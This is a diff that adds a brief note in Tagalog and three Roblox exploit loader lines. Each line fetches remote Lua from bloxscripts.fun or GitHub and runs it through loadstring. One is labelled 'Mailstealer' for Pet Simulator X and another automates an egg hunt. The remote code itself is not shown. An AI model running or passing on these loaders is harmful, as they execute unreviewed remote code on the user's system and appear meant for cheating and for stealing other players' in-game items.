@@ -1,0 +1,7 @@
+Gawa ako video nito kung paano tong script itong dalawa 
+loadstring(game:HttpGetAsync("https://bloxscripts.fun/scripts/3100e000aa.lua", true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/slendly/Script-pet-sim-x/main/Mailstealer"))()
+
+Egg hunt Script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Levi4Chan/Rblx-Scripts/main/Auto-Easter-Egg.lua"))()
